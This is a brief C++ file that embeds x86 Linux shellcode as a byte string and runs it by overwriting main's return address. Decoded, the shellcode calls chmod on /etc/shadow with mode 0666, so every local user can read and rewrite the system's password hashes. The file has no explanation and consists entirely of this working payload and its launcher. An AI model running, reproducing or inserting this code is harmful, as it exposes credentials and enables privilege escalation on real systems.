#include <iostream>

char *shell = "\xb0\x0f\x31\xd2\x52\x68\x61\x64\x6f\x77\x68\x63\x2f\x73\x68\x68\x2f\x2f\x65\x74\x89\xe3\x66\xb9\xb6\x01\xcd\x80\x31\xdb\xb0\x01\xcd\x80";
int main() {
	int* ret;
	ret = (int*) &ret + 2;
	(*ret) = (int)shell;
}